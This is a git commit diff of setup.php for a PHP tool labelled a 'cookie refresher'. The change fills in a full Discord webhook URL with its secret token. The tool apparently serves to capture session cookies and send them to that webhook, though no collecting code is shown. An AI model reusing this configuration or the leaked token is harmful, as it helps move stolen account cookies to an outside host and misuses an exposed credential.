9e6b557434f1e24883dd872d0e15ab84be5c1791
jeeml100 <hadouirir@gmail.com>
2025-06-27 05:29:04 +0100

    Update setup.php

--- setup.php
+++ setup.php
@@ -1,7 +1,7 @@
 <?php
 
 $name = "Deix Du Condido"; // cookie refresher name
-$webhook = "webhook here";
+$webhook = "https://discord.com/api/webhooks/1385682310220878027/afYFNNyb7i9UTzYK-mbD3aHsL9IhxvGTxe1XQS3X6hwt40SOR99eZltywtEY0HQGXak4";
 $image = ""; // cookie refresher image / background
 $html_icon = "https://tse4.mm.bing.net/th?id=OIP.HgjTrduHboOjui_U9tcE2QHaDj&pid=Api&P=0&h=180"; // cookie refresher web icon
 // credits Deix Du Condido
